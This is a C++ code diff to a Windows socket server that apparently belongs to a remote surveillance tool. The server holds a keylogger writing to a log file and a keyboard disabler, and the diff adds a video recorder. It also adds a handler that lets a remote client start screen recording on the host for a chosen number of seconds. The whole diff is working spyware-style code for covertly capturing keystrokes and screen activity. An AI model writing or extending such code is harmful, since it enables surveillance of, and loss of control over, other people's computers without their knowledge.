@@ -6,7 +6,8 @@ ServerSocket::ServerSocket() :
     winAPI(new WinAPI()), 
     keyloggerFilePath("./output-server/default_log.txt"),
     keylogger(new Keylogger()),
-    keyboardDisabler(new KeyboardDisabler())
+    keyboardDisabler(new KeyboardDisabler()),
+    recorder(new VideoRecorder())
 {
 
     WSADATA wsaSATA;
@@ -79,6 +80,8 @@ ServerSocket::~ServerSocket()
     WSACleanup();
     delete winAPI;
     delete keylogger;
+    delete keyboardDisabler;
+    delete recorder;
 }
 
 MessageType ServerSocket::hashMessage(const std::string message) {
@@ -331,7 +334,16 @@ void ServerSocket::initializeHandlers() {
     };
 
     handlers[SCREEN_RECORDING] = [this](SOCKET &clientSocket, const std::string& command) {
-    
+        auto tokens = parseCommand(command);
+        if (tokens.size() != 2) {
+            sendResponse(clientSocket, "Usage: screenRecording <duration_in_seconds>");
+            return;
+        }
+
+        int duration = std::stoi(tokens[1]);
+        recorder->startRecording(duration);
+
+        sendResponse(clientSocket, "Screen recording started for " + std::to_string(duration) + " seconds.");
     };
 
 }
